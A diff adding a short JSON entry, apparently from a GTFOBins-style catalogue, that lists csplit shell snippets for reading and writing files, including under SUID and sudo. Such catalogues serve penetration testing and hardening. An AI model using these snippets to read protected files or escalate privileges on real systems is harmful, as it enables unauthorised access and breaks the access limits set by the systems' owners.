@@ -1,0 +1,25 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).",
+        "code": "TF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
+      }
+    ]
+  }
+}
